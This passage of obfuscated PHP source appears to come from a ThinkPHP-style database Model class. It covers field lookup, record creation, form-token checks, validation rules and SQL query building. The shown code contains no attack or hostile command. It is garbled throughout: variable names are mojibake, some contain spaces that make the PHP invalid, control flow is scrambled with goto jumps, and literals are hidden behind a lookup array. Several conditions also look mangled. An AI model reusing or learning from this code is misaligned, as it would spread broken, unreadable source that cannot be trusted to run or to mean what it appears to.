unset($Fß©¡ÁÌ±ä[$Eœí¶í§‘è]); } } else { if (isset($Fß©¡ÁÌ±ä[$c’¡é‰í£è])) { $Fß©¡ÁÌ±ä[$Eœí¶í§‘è] = $Fß©¡ÁÌ±ä[$c’¡é‰í£è]; unset($Fß©¡ÁÌ±ä[$c’¡é‰í£è]); } } } } return $Fß©¡ÁÌ±ä; } public function setField($dÍÚÕÓ◊’∏, $bÆüŸ›ê›∏ = '') { if (is_array($dÍÚÕÓ◊’∏)) { $aîäØÂœàä = $dÍÚÕÓ◊’∏; } else { $aîäØÂœàä[$dÍÚÕÓ◊’∏] = $bÆüŸ›ê›∏; } return $this->save($aîäØÂœàä); } public function setAdd($D¬Îú—´¥î, $C≠Èˆ™â‹£ = 1) { $c∂˘Ã»›üı =& $_SERVER[∞„˜ƒÑºª]; $A—êΩãË’ó = $D¬Îú—´¥î . $c∂˘Ã»›üı[283] . $C≠Èˆ™â‹£; if ($C≠Èˆ™â‹£ < 0) { $A—êΩãË’ó = $D¬Îú—´¥î . $C≠Èˆ™â‹£; } return $this->setField($D¬Îú—´¥î, array($c∂˘Ã»›üı[284], $A—êΩãË’ó)); } public function getField($cÊÊ∂ü†™¡, $aƒØ–«∫… = null) { $Aç§ô¥Õçﬂ =& $_SERVER[∞„˜ƒÑºª]; $B˜ÏÀÉÜÜ°[$Aç§ô¥Õçﬂ[260]] = $cÊÊ∂ü†™¡; $B˜ÏÀÉÜÜ° = $this->_parseOptions($B˜ÏÀÉÜÜ°); $cÊÊ∂ü†™¡ = trim($cÊÊ∂ü†™¡); if (strpos($cÊÊ∂ü†™¡, $Aç§ô¥Õçﬂ[47])) { if (!isset($B˜ÏÀÉÜÜ°[$Aç§ô¥Õçﬂ[279]])) { $B˜ÏÀÉÜÜ°[$Aç§ô¥Õçﬂ[279]] = is_numeric($aƒØ–«∫…) ? $aƒØ–«∫… : $Aç§ô¥Õçﬂ[33]; } $AÚ‡¢≈àôÑ = $this->db->select($B˜ÏÀÉÜÜ°); if (!empty($AÚ‡¢≈àôÑ)) { goto eÖ∑æ≈≤æ‡; cª¨†ÙìÛ”: foreach ($AÚ‡¢≈àôÑ as $B°ﬁ¿âé≠ª) { $EóÀ»˜√£± = $B°ﬁ¿âé≠ª[$c÷áŒ„æèÏ]; if (2 == $F©∑Èì≠¶Ò) { $D⁄ÖƒîéÇ»[$EóÀ»˜√£±] = $B°ﬁ¿âé≠ª[$c®ç¯âûµé]; } else { $D⁄ÖƒîéÇ»[$EóÀ»˜√£±] = is_string($aƒØ–«∫…) ? implode($aƒØ–«∫…, $B°ﬁ¿âé≠ª) : $B°ﬁ¿âé≠ª; } } return $D⁄ÖƒîéÇ»; goto dË⁄àΩÆÆË; eÀ ﬁœÑ€«: $c®ç¯âûµé = array_shift($cÊÊ∂ü†™¡); $D⁄ÖƒîéÇ» = array(); $F©∑Èì≠¶Ò = count($bó‰õóÆ§∫); goto cª¨†ÙìÛ”; eÖ∑æ≈≤æ‡: $bó‰õóÆ§∫ = explode($Aç§ô¥Õçﬂ[47], $cÊÊ∂ü†™¡); $cÊÊ∂ü†™¡ = array_keys($AÚ‡¢≈àôÑ[0]); $c÷áŒ„æèÏ = array_shift($cÊÊ∂ü†™¡); goto eÀ ﬁœÑ€«; dË⁄àΩÆÆË: } } else { if (!0 !== $aƒØ–«∫…) { $B˜ÏÀÉÜÜ°[$Aç§ô¥Õçﬂ[279]] = is_numeric($aƒØ–«∫…) ? $aƒØ–«∫… : 1; } if ($aƒØ–«∫… === $Aç§ô¥Õçﬂ[242]) { unset($B˜ÏÀÉÜÜ°[$Aç§ô¥Õçﬂ[279]]); } $B°ﬁ¿âé≠ª = $this->db->select($B˜ÏÀÉÜÜ°); if (!empty($B°ﬁ¿âé≠ª)) { if ($aƒØ–«∫… === $Aç§ô¥Õçﬂ[242]) { return reset($B°ﬁ¿âé≠ª[0]); } if (!0 !== $aƒØ–«∫… && 1 == $B˜ÏÀÉÜÜ°[$Aç§ô¥Õçﬂ[279]]) { return reset($B°ﬁ¿âé≠ª[0]); } foreach ($B°ﬁ¿âé≠ª as $eâ»™ÒÎÎÒ) { $D—⁄ñ°áôÇ[] = $eâ»™ÒÎÎÒ[$cÊÊ∂ü†™¡]; } return $D—⁄ñ°áôÇ; } } return null; } public function create($D›Àêá∑ä = '', $DàÉﬁÌÀó§ = '') { goto FΩæÜª®òã; FΩæÜª®òã: $bë‡Ã¯‹„ﬂ =& $_SERVER[∞„˜ƒÑºª]; if (empty($D›Àêá∑ä)) { $D›Àêá∑ä = $_POST; } elseif (is_object($D›Àêá∑ä)) { $D›Àêá∑ä = get_object_vars($D›Àêá∑ä); } if (empty($D›Àêá∑ä) || !is_array($D›Àêá∑ä)) { $this->error = think_lang($bë‡Ã¯‹„ﬂ[258]); return !1; } goto BÛ”ËΩØÛ¬; A›èõﬂÖ™ : if (isset($d√¢ô≤âΩ )) { if (is_string($d√¢ô≤âΩ )) { $d√¢ô≤âΩ  = explode($bë‡Ã¯‹„ﬂ[47], $d√¢ô≤âΩ ); } if (think_config($bë‡Ã¯‹„ﬂ[285])) { $d√¢ô≤âΩ [] = think_config($bë‡Ã¯‹„ﬂ[286]); } foreach ($D›Àêá∑ä as $A≈êëäßÈä => $B€√ÖÃëÉ¥) { if (!in_array($A≈êëäßÈä, $d√¢ô≤âΩ )) { unset($D›Àêá∑ä[$A≈êëäßÈä]); } } } if (!$this->autoValidation($D›Àêá∑ä, $DàÉﬁÌÀó§)) { return !1; } if (!$this->autoCheckToken($D›Àêá∑ä)) { $this->error = think_lang($bë‡Ã¯‹„ﬂ[287]); return !1; } goto Fø®ñØéü†; Fø®ñØéü†: if ($this->autoCheckFields) { $d√¢ô≤âΩ  = $this->getDbFields(); foreach ($D›Àêá∑ä as $A≈êëäßÈä => $B€√ÖÃëÉ¥) { if (!in_array($A≈êëäßÈä, $d√¢ô≤âΩ )) { unset($D›Àêá∑ä[$A≈êëäßÈä]); } elseif (MAGIC_QUOTES_GPC && is_string($B€√ÖÃëÉ¥)) { $D›Àêá∑ä[$A≈êëäßÈä] = stripslashes($B€√ÖÃëÉ¥); } } } $this->autoOperation($D›Àêá∑ä, $DàÉﬁÌÀó§); $this->data = $D›Àêá∑ä; goto b∞“ºÌ∏™ñ; b∞“ºÌ∏™ñ: return $D›Àêá∑ä; goto cØΩç•éúê; BÛ”ËΩØÛ¬: $D›Àêá∑ä = $this->parseFieldsMap($D›Àêá∑ä, 0); $DàÉﬁÌÀó§ = $DàÉﬁÌÀó§ ? $DàÉﬁÌÀó§ : (!empty($D›Àêá∑ä[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bë‡Ã¯‹„ﬂ[260]])) { $d√¢ô≤âΩ  = $this->options[$bë‡Ã¯‹„ﬂ[260]]; unset($this->options[$bë‡Ã¯‹„ﬂ[260]]); } elseif ($DàÉﬁÌÀó§ == THINK_MODEL_INSERT && isset($this->insertFields)) { $d√¢ô≤âΩ  = $this->insertFields; } elseif ($DàÉﬁÌÀó§ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $d√¢ô≤âΩ  = $this->updateFields; } goto A›èõﬂÖ™ ; cØΩç•éúê: } public function autoCheckToken($B„≤ÚÕ¥™ä) { $FÑâïŸ≈Æ» =& $_SERVER[∞„˜ƒÑºª]; if (isset($this->options[$FÑâïŸ≈Æ»[288]]) && !$this->options[$FÑâïŸ≈Æ»[288]]) { return !0; } if (think_config($FÑâïŸ≈Æ»[285])) { $BæÉ øè◊ã = think_config($FÑâïŸ≈Æ»[286]); if (!isset($B„≤ÚÕ¥™ä[$BæÉ øè◊ã]) || Session::get($BæÉ øè◊ã)) { return !1; } list($Fâª…¥Öâî, $bÚêñŸé√) = explode($FÑâïŸ≈Æ»[79], $B„≤ÚÕ¥™ä[$BæÉ øè◊ã]); if ($bÚêñŸé√ && Session::get($BæÉ øè◊ã . $FÑâïŸ≈Æ»[98] . $Fâª…¥Öâî) === $bÚêñŸé√) { Session::remove($BæÉ øè◊ã . $FÑâïŸ≈Æ»[98] . $Fâª…¥Öâî); return !0; } if (think_config($FÑâïŸ≈Æ»[289])) { Session::remove($BæÉ øè◊ã . $FÑâïŸ≈Æ»[98] . $Fâª…¥Öâî); } return !1; } return !0; } public function regex($f§ﬁ€Ô±ÉÈ, $fΩ®ˆÓÜË¥) { $Bï¿Üêëá‰ =& $_SERVER[∞„˜ƒÑºª]; $c≠åÖÂ¢Ãπ = array($Bï¿Üêëá‰[290] => $Bï¿Üêëá‰[291], $Bï¿Üêëá‰[292] => $Bï¿Üêëá‰[293], $Bï¿Üêëá‰[294] => $Bï¿Üêëá‰[295], $Bï¿Üêëá‰[296] => $Bï¿Üêëá‰[297], $Bï¿Üêëá‰[298] => $Bï¿Üêëá‰[299], $Bï¿Üêëá‰[300] => $Bï¿Üêëá‰[301], $Bï¿Üêëá‰[302] => $Bï¿Üêëá‰[303], $Bï¿Üêëá‰[277] => $Bï¿Üêëá‰[304], $Bï¿Üêëá‰[305] => $Bï¿Üêëá‰[306]); if (isset($c≠åÖÂ¢Ãπ[strtolower($fΩ®ˆÓÜË¥)])) { $fΩ®ˆÓÜË¥ = $c≠åÖÂ¢Ãπ[strtolower($fΩ®ˆÓÜË¥)]; } return preg_match($fΩ®ˆÓÜË¥, $f§ﬁ€Ô±ÉÈ) === 1; } private function autoOperation(&$fÌ®Ö†ñ’ù, $Fπ†≈Îß¡ç) { $Aà°äëå„Ï =& $_SERVER[∞„˜ƒÑºª]; if (!empty($this->options[$Aà°äëå„Ï[307]])) { $d‚…§®Õà¿ = $this->options[$Aà°äëå„Ï[307]]; unset($this->options[$Aà°äëå„Ï[307]]); } elseif (!empty($this->_auto)) { $d‚…§®Õà¿ = $this->_auto; } if (isset($d‚…§®Õà¿)) { foreach ($d‚…§®Õà¿ as $cøÖå¬ß ≈) { if (empty($cøÖå¬ß ≈[2])) { $cøÖå¬ß ≈[2] = THINK_MODEL_INSERT; } if ($Fπ†≈Îß¡ç == $cøÖå¬ß ≈[2] || $cøÖå¬ß ≈[2] == THINK_MODEL_BOTH) { switch (trim($cøÖå¬ß ≈[3])) { case $Aà°äëå„Ï[308]: case $Aà°äëå„Ï[309]: $cãµ¥ãè Ñ = isset($cøÖå¬ß ≈[4]) ? (array) $cøÖå¬ß ≈[4] : array(); if (isset($fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]])) { array_unshift($cãµ¥ãè Ñ, $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]]); } if ($Aà°äëå„Ï[308] == $cøÖå¬ß ≈[3]) { $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]] = call_user_func_array($cøÖå¬ß ≈[1], $cãµ¥ãè Ñ); } else { $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]] = call_user_func_array(array(&$this, $cøÖå¬ß ≈[1]), $cãµ¥ãè Ñ); } break; case $Aà°äëå„Ï[260]: $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]] = $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[1]]; break; case $Aà°äëå„Ï[310]: if ($Aà°äëå„Ï[33] === $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]]) { unset($fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]]); } break; case $Aà°äëå„Ï[311]: default: $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]] = $cøÖå¬ß ≈[1]; } if (!1 === $fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]]) { unset($fÌ®Ö†ñ’ù[$cøÖå¬ß ≈[0]]); } } } } return $fÌ®Ö†ñ’ù; } protected function autoValidation($f°Œòî‹èö, $c∂∞Âö•ëà) { $B©’õÀ˜Ü® =& $_SERVER[∞„˜ƒÑºª]; if (!empty($this->options[$B©’õÀ˜Ü®[312]])) { $A¨‡¨ç†õ∆ = $this->options[$B©’õÀ˜Ü®[312]]; unset($this->options[$B©’õÀ˜Ü®[312]]); } elseif (!empty($this->_validate)) { $A¨‡¨ç†õ∆ = $this->_validate; } if (isset($A¨‡¨ç†õ∆)) { if ($this->patchValidate) { $this->error = array(); } foreach ($A¨‡¨ç†õ∆ as $e•°ºÉãçÙ => $fòıœó Îµ) { if (empty($fòıœó Îµ[5]) || $fòıœó Îµ[5] == THINK_MODEL_BOTH || $fòıœó Îµ[5] == $c∂∞Âö•ëà) { if (0 == strpos($fòıœó Îµ[2], $B©’õÀ˜Ü®[313]) && strpos($fòıœó Îµ[2], $B©’õÀ˜Ü®[314])) { $fòıœó Îµ[2] = think_lang(substr($fòıœó Îµ[2], 2, -1)); } $fòıœó Îµ[3] = isset($fòıœó Îµ[3]) ? $fòıœó Îµ[3] : THINK_EXISTS_VALIDATE; $fòıœó Îµ[4] = isset($fòıœó Îµ[4]) ? $fòıœó Îµ[4] : $B©’õÀ˜Ü®[315]; switch ($fòıœó Îµ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($f°Œòî‹èö, $fòıœó Îµ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($B©’õÀ˜Ü®[33] != trim($f°Œòî‹èö[$fòıœó Îµ[0]])) { if (!1 === $this->_validationField($f°Œòî‹èö, $fòıœó Îµ)) { return !1; } } break; default: if (isset($f°Œòî‹èö[$fòıœó Îµ[0]])) { if (!1 === $this->_validationField($f°Œòî‹èö, $fòıœó Îµ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($D≥⁄ÏéæÂŸ, $cˆÀñÃ´Ö¡) { if (!1 === $this->_validationFieldItem($D≥⁄ÏéæÂŸ, $cˆÀñÃ´Ö¡)) { if ($this->patchValidate) { $this->error[$cˆÀñÃ´Ö¡[0]] = $cˆÀñÃ´Ö¡[2]; } else { $this->error = $cˆÀñÃ´Ö¡[2]; return !1; } } return; } protected function _validationFieldItem($aÖ¢¥∏⁄–Û, $aÆÒ‰¿…®ó) { $fµä√πÂé∂ =& $_SERVER[∞„˜ƒÑºª]; switch (strtolower(trim($aÆÒ‰¿…®ó[4]))) { case $fµä√πÂé∂[308]: case $fµä√πÂé∂[309]: $fÃ∞∑ÚÉÂÜ = isset($aÆÒ‰¿…®ó[6]) ? (array) $aÆÒ‰¿…®ó[6] : array(); if (is_string($aÆÒ‰¿…®ó[0]) && strpos($aÆÒ‰¿…®ó[0], $fµä√πÂé∂[47])) { $aÆÒ‰¿…®ó[0] = explode($fµä√πÂé∂[47], $aÆÒ‰¿…®ó[0]); } if (is_array($aÆÒ‰¿…®ó[0])) { foreach ($aÆÒ‰¿…®ó[0] as $c‰ØÒ÷Ë∂Ñ) { $aÙ∂®∆⁄Øø[$c‰ØÒ÷Ë∂Ñ] = $aÖ¢¥∏⁄–Û[$c‰ØÒ÷Ë∂Ñ]; } array_unshift($fÃ∞∑ÚÉÂÜ, $aÙ∂®∆⁄Øø); } else { array_unshift($fÃ∞∑ÚÉÂÜ, $aÖ¢¥∏⁄–Û[$aÆÒ‰¿…®ó[0]]); } if ($fµä√πÂé∂[308] == $aÆÒ‰¿…®ó[4]) { return call_user_func_array($aÆÒ‰¿…®ó[1], $fÃ∞∑ÚÉÂÜ); } else { return call_user_func_array(array(&$this, $aÆÒ‰¿…®ó[1]), $fÃ∞∑ÚÉÂÜ); } case $fµä√πÂé∂[316]: return $aÖ¢¥∏⁄–Û[$aÆÒ‰¿…®ó[0]] == $aÖ¢¥∏⁄–Û[$aÆÒ‰¿…®ó[1]]; case $fµä√πÂé∂[317]: if (is_string($aÆÒ‰¿…®ó[0]) && strpos($aÆÒ‰¿…®ó[0], $fµä√πÂé∂[47])) { $aÆÒ‰¿…®ó[0] = explode($fµä√πÂé∂[47], $aÆÒ‰¿…®ó[0]); } $eï≤±¥à ¡ = array(); if (is_array($aÆÒ‰¿…®ó[0])) { foreach ($aÆÒ‰¿…®ó[0] as $c‰ØÒ÷Ë∂Ñ) { $eï≤±¥à ¡[$c‰ØÒ÷Ë∂Ñ] = $aÖ¢¥∏⁄–Û[$c‰ØÒ÷Ë∂Ñ]; } } else { $eï≤±¥à ¡[$aÆÒ‰¿…®ó[0]] = $aÖ¢¥∏⁄–Û[$aÆÒ‰¿…®ó[0]]; } if (!empty($aÖ¢¥∏⁄–Û[$this->getPk()])) { $eï≤±¥à ¡[$this->getPk()] = array($fµä√πÂé∂[318], $aÖ¢¥∏⁄–Û[$this->getPk()]); } if ($this->where($eï≤±¥à ¡)->find()) { return !1; } return !0; default: return $this->check($aÖ¢¥∏⁄–Û[$aÆÒ‰¿…®ó[0]], $aÆÒ‰¿…®ó[1], $aÆÒ‰¿…®ó[4]); } } public function check($AÈ»¢ÏºÇ, $E—ŒËñ⁄‚é, $Cà‚Â“¨ª™ = "\162\x65\147\145\170") { $cï»éÖ¿◊∫ =& $_SERVER[∞„˜ƒÑºª]; $Cà‚Â“¨ª™ = strtolower(trim($Cà‚Â“¨ª™)); switch ($Cà‚Â“¨ª™) { case $cï»éÖ¿◊∫[7]: case $cï»éÖ¿◊∫[319]: $AêˆË⁄Ù∞π = is_array($E—ŒËñ⁄‚é) ? $E—ŒËñ⁄‚é : explode($cï»éÖ¿◊∫[47], $E—ŒËñ⁄‚é); return $Cà‚Â“¨ª™ == $cï»éÖ¿◊∫[7] ? in_array($AÈ»¢ÏºÇ, $AêˆË⁄Ù∞π) : !in_array($AÈ»¢ÏºÇ, $AêˆË⁄Ù∞π); case $cï»éÖ¿◊∫[320]: case $cï»éÖ¿◊∫[321]: if (is_array($E—ŒËñ⁄‚é)) { $Cè©”å©’Ã = $E—ŒËñ⁄‚é[0]; $FÀàÿπú∏· = $E—ŒËñ⁄‚é[1]; } else { list($Cè©”å©’Ã, $FÀàÿπú∏·) = explode($cï»éÖ¿◊∫[47], $E—ŒËñ⁄‚é); } return $Cà‚Â“¨ª™ == $cï»éÖ¿◊∫[320] ? $AÈ»¢ÏºÇ >= $Cè©”å©’Ã && $AÈ»¢ÏºÇ <= $FÀàÿπú∏· : $AÈ»¢ÏºÇ < $Cè©”å©’Ã || $AÈ»¢ÏºÇ > $FÀàÿπú∏·; case $cï»éÖ¿◊∫[322]: case $cï»éÖ¿◊∫[323]: return $Cà‚Â“¨ª™ == $cï»éÖ¿◊∫[322] ? $AÈ»¢ÏºÇ == $E—ŒËñ⁄‚é : $AÈ»¢ÏºÇ != $E—ŒËñ⁄‚é; case $cï»éÖ¿◊∫[324]: $bΩÿ°ã”§ = mb_strlen($AÈ»¢ÏºÇ, $cï»éÖ¿◊∫[325]); if (strpos($E—ŒËñ⁄‚é, $cï»éÖ¿◊∫[47])) { list($Cè©”å©’Ã, $FÀàÿπú∏·) = explode($cï»éÖ¿◊∫[47], $E—ŒËñ⁄‚é); return $bΩÿ°ã”§ >= $Cè©”å©’Ã && $bΩÿ°ã”§ <= $FÀàÿπú∏·; } else { return $bΩÿ°ã”§ == $E—ŒËñ⁄‚é; } case $cï»éÖ¿◊∫[326]: list($dîÔ™∂∫òÇ, $E∆ÍΩ‡∑Ñé) = explode($cï»éÖ¿◊∫[47], $E—ŒËñ⁄‚é); if (!is_numeric($dîÔ™∂∫òÇ)) { $dîÔ™∂∫òÇ = strtotime($dîÔ™∂∫òÇ); } if (!is_numeric($E∆ÍΩ‡∑Ñé)) { $E∆ÍΩ‡∑Ñé = strtotime($E∆ÍΩ‡∑Ñé); } return NOW_TIME >= $dîÔ™∂∫òÇ && NOW_TIME <= $E∆ÍΩ‡∑Ñé; case $cï»éÖ¿◊∫[327]: return in_array(get_client_ip(), explode($cï»éÖ¿◊∫[47], $E—ŒËñ⁄‚é)); case $cï»éÖ¿◊∫[328]: return !in_array(get_client_ip(), explode($cï»éÖ¿◊∫[47], $E—ŒËñ⁄‚é)); case $cï»éÖ¿◊∫[315]: default: return $this->regex($AÈ»¢ÏºÇ, $E—ŒËñ⁄‚é); } } public function query($eåÏÓ≈áßß, $A™ú´œƒƒ⁄ = false) { $Fµèÿÿ“Ö≥ =& $_SERVER[∞„˜ƒÑºª]; if (!is_bool($A™ú´œƒƒ⁄) && !is_array($A™ú´œƒƒ⁄)) { $A™ú´œƒƒ⁄ = func_get_args(); array_shift($A™ú´œƒƒ⁄); } $eåÏÓ≈áßß = str_replace(array($Fµèÿÿ“Ö≥[55], $Fµèÿÿ“Ö≥[329]), $Fµèÿÿ“Ö≥[50], $eåÏÓ≈áßß); $eåÏÓ≈áßß = $this->parseSql($eåÏÓ≈áßß, $A™ú´œƒƒ⁄); return $this->db->query($eåÏÓ≈áßß); } public function execute($bÙΩ≠„ÜãË, $FÈ˘Æßëá” = false) { if (!is_bool($FÈ˘Æßëá”) && !is_array($FÈ˘Æßëá”)) { $FÈ˘Æßëá” = func_get_args(); array_shift($FÈ˘Æßëá”); } $bÙΩ≠„ÜãË = $this->parseSql($bÙΩ≠„ÜãË, $FÈ˘Æßëá”); return $this->db->execute($bÙΩ≠„ÜãË); } protected function parseSql($cΩ§Œ‡‰•¯, $b•Ç†°öÌµ) { $D∆ßÛ´¶»Ω =& $_SERVER[∞„˜ƒÑºª]; if (!0 === $b•Ç†°öÌµ) { $e¥êèÑ≈„Ω = $this->_parseOptions(); $cΩ§Œ‡‰•¯ = $this->db->parseSql($cΩ§Œ‡‰•¯, $e¥êèÑ≈„Ω); } elseif (is_array($b•Ç†°öÌµ)) { $b•Ç†°öÌµ = array_map(array($this->db, $D∆ßÛ´¶»Ω[330]), $b•Ç†°öÌµ); $cΩ§Œ‡‰•¯ = vsprintf($cΩ§Œ‡‰•¯, $b•Ç†°öÌµ); } else { $cΩ§Œ‡‰•¯ = strtr($cΩ§Œ‡‰•¯, array($D∆ßÛ´¶»Ω[331] => $this->getTableName(), $D∆ßÛ´¶»Ω[332] => think_config($D∆ßÛ´¶»Ω[231]))); } $this->db->setModel($this->name); return $cΩ§Œ‡‰•¯; } public function db($BÉäÆ±Ê‡Ω = '', $DÖéÇØå¯Ñ = '', $DΩ¡¥¯æÊ  = array()) { goto AèÇö∞óãÖ; aëõ®—ﬂÍû: $Cº”á˜√À‡[$BÉäÆ±Ê‡Ω] = $DÖéÇØå¯Ñ; $this->db = $eø÷ö√Ö§À[$BÉäÆ±Ê‡Ω]; $this->_after_db(); goto eƒå¶ç∆Ñ∂; AèÇö∞óãÖ: $A¶—Ã…Ÿì≠ =& $_SERVER[∞„˜ƒÑºª]; if ($A¶—Ã…Ÿì≠[33] === $BÉäÆ±Ê‡Ω && $this->db) { return $this->db; } static $Cº”á˜√À‡ = array(); goto aµ»©ﬂ„æ„; eƒå¶ç∆Ñ∂: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto DÛúÒπÓâ; aµ»©ﬂ„æ„: static $eø÷ö√Ö§À = array(); if (!isset($eø÷ö√Ö§À[$BÉäÆ±Ê‡Ω]) || isset($eø÷ö√Ö§À[$BÉäÆ±Ê‡Ω]) && $DÖéÇØå¯Ñ && $Cº”á˜√À‡[$BÉäÆ±Ê‡Ω] != $DÖéÇØå¯Ñ) { if (!empty($DÖéÇØå¯Ñ) && is_string($DÖéÇØå¯Ñ) && !1 === strpos($DÖéÇØå¯Ñ, $A¶—Ã…Ÿì≠[8])) { $DÖéÇØå¯Ñ = think_config($DÖéÇØå¯Ñ); } $eø÷ö√Ö§À[$BÉäÆ±Ê‡Ω] = Db::getInstance($DÖéÇØå¯Ñ); } elseif (NULL === $DÖéÇØå¯Ñ) { $eø÷ö√Ö§À[$BÉäÆ±Ê‡Ω]->close(); unset($eø÷ö√Ö§À[$BÉäÆ±Ê‡Ω]); return; } if (!empty($DΩ¡¥¯æÊ )) { if (is_string($DΩ¡¥¯æÊ )) { parse_str($DΩ¡¥¯æÊ , $DΩ¡¥¯æÊ ); } foreach ($DΩ¡¥¯æÊ  as $F·üÓãº™ä => $aÀ·ëÕ·ÓÜ) { $this->setProperty($F·üÓãº™ä, $aÀ·ëÕ·ÓÜ); } } goto aëõ®—ﬂÍû; DÛúÒπÓâ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $AÜ’–ÈÏÀß = get_class($this); if ($AÜ’–ÈÏÀß == $_SERVER[∞„˜ƒÑºª][333]) { return $this->name; } $this->name = substr($AÜ’–ÈÏÀß, 0, -5); } return $this->name; } public function getTableName() { $b–èŒÙ¶èµ =& $_SERVER[∞„˜ƒÑºª]; if (empty($this->trueTableName)) { $C≈Ω≈¨¬èÕ = !empty($this->tablePrefix) ? $this->tablePrefix : $b–èŒÙ¶èµ[33]; if (!empty($this->tableName)) { $C≈Ω≈¨¬èÕ .= $this->tableName; } else { $C≈Ω≈¨¬èÕ .= think_parse_name($this->name); } $this->trueTableName = strtolower($C≈Ω≈¨¬èÕ); } return (!empty($this->dbName) ? $this->dbName . $b–èŒÙ¶èµ[98] : $b–èŒÙ¶èµ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $C√Ë∞⁄Éõ± =& $_SERVER[∞„˜ƒÑºª]; return isset($this->fields[$C√Ë∞⁄Éõ±[238]]) ? $this->fields[$C√Ë∞⁄Éõ±[238]] : $this->pk; } public function getDbFields() { $Eõ”ËÇäæ§ =& $_SERVER[∞„˜ƒÑºª]; if (isset($this->options[$Eõ”ËÇäæ§[266]])) { $b∞‰êíÛ≠É = $this->db->getFields($this->options[$Eõ”ËÇäæ§[266]]); return $b∞‰êíÛ≠É ? array_keys($b∞‰êíÛ≠É) : !1; } if ($this->fields) { $b∞‰êíÛ≠É = $this->fields; unset($b∞‰êíÛ≠É[$Eõ”ËÇäæ§[237]], $b∞‰êíÛ≠É[$Eõ”ËÇäæ§[238]], $b∞‰êíÛ≠É[$Eõ”ËÇäæ§[239]], $b∞‰êíÛ≠É[$Eõ”ËÇäæ§[236]]); return $b∞‰êíÛ≠É; } return !1; } public function data($a‚Øø˜ë–ø = '') { $C’≤≠ÒåãÂ =& $_SERVER[∞„˜ƒÑºª]; if ($C’≤≠ÒåãÂ[33] === $a‚Øø˜ë–ø && !empty($this->data)) { return $this->data; } if (is_object($a‚Øø˜ë–ø)) { $a‚Øø˜ë–ø = get_object_vars($a‚Øø˜ë–ø); } elseif (is_string($a‚Øø˜ë–ø)) { parse_str($a‚Øø˜ë–ø, $a‚Øø˜ë–ø); } elseif (!is_array($a‚Øø˜ë–ø)) { think_exception(think_lang($C’≤≠ÒåãÂ[258])); } $this->data = $a‚Øø˜ë–ø; return $this; } public function join($b∫«”˜ÙÌŒ) { $D√ΩÙ°Ø¥† =& $_SERVER[∞„˜ƒÑºª]; if (is_array($b∫«”˜ÙÌŒ)) { $this->options[$D√ΩÙ°Ø¥†[269]] = $b∫«”˜ÙÌŒ; } elseif (!empty($b∫«”˜ÙÌŒ)) { $this->options[$D√ΩÙ°Ø¥†[269]][] = $b∫«”˜ÙÌŒ; } return $this; } public function union($Fëå÷ÃÃî», $cø¯äÈ‡ëÚ = false) { goto cÆÿåçÀø÷; B¶Ú÷‹˘µœ: if (is_object($Fëå÷ÃÃî»)) { $Fëå÷ÃÃî» = get_object_vars($Fëå÷ÃÃî»); } if (is_string($Fëå÷ÃÃî»)) { $CÈà›±ËÁ– = $Fëå÷ÃÃî»; } elseif (is_array($Fëå÷ÃÃî»)) { if (isset($Fëå÷ÃÃî»[0])) { $this->options[$A√¢ÚùÓ¯·[334]] = array_merge($this->options[$A√¢ÚùÓ¯·[334]], $Fëå÷ÃÃî»); return $this; } else { $CÈà›±ËÁ– = $Fëå÷ÃÃî»; } } else { think_exception(think_lang($A√¢ÚùÓ¯·[258])); } $this->options[$A√¢ÚùÓ¯·[334]][] = $CÈà›±ËÁ–; goto aï–õÍåóè; cÆÿåçÀø÷: $A√¢ÚùÓ¯· =& $_SERVER[∞„˜ƒÑºª]; if (empty($Fëå÷ÃÃî»)) { return $this; } if ($cø¯äÈ‡ëÚ) { $this->options[$A√¢ÚùÓ¯·[334]][$A√¢ÚùÓ¯·[335]] = !0; } goto B¶Ú÷‹˘µœ; aï–õÍåóè: return $this; goto bã∏óÉ¬˘§; bã∏óÉ¬˘§: } public function cache($B™µÓéﬁ–” = true, $e◊÷ÁüÕπŸ = null, $EµØ€Æ®˘Ê = '') { $bØÊü◊áâ“ =& $_SERVER[∞„˜ƒÑºª]; if (!1 !== $B™µÓéﬁ–”) { $this->options[$bØÊü◊áâ“[336]] = array($bØÊü◊áâ“[96] => $B™µÓéﬁ–”, $bØÊü◊áâ“[326] => $e◊÷ÁüÕπŸ, $bØÊü◊áâ“[29] => $EµØ€Æ®˘Ê); } return $this; } public function field($dœ…»”ıÓ©, $eÈéå¨¨ùµ = false) { $b–‘çç»ö√ =& $_SERVER[∞„˜ƒÑºª]; if (!0 === $dœ…»”ıÓ©) { $b¢ìÉ√çÖ¶ = $this->getDbFields(); $dœ…»”ıÓ© = $b¢ìÉ√çÖ¶ ? $b¢ìÉ√çÖ¶ : $b–‘çç»ö√[172]; } elseif ($eÈéå¨¨ùµ) { if (is_string($dœ…»”ıÓ©)) { $dœ…»”ıÓ© = explode($b–‘çç»ö√[47], $dœ…»”ıÓ©); } $b¢ìÉ√çÖ¶ = $this->getDbFields(); $dœ…»”ıÓ© = $b¢ìÉ√çÖ¶ ? array_diff($b¢ìÉ√çÖ¶, $dœ…»”ıÓ©) : $dœ…»”ıÓ©; } $this->options[$b–‘çç»ö√[260]] = $dœ…»”ıÓ©; return $this; } public function scope($aéôÈçÜñ¡ = '', 